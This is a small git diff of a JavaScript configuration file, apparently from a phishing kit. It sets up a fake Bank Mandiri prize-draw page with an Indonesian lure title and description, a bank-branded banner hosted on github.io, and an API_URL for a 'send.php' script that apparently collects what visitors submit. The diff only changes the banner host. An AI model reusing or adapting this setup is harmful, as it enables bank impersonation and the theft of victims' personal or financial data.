@@ -3,7 +3,7 @@ const APP_TITLE = "Daftar Kupon Undian Sekarang";
 // Deskripsi web/iklan
 const APP_DESC = "Dapatkan hadiah menarik dari Bank Mandiri buat kamu yang beruntung";
 // URL banner gambar
-const BANNER_URL = "https://hlxo.github.io/links/banners/link_preview_mandiri.jpg";
+const BANNER_URL = "https://xylhg.github.io/links/banners/link_preview_mandiri.jpg";
 // URL API (tempat dimana file send.php ditaruh, kosongkan jika file send.php ditaruh di halaman depan/root)
 const API_URL = "";
 
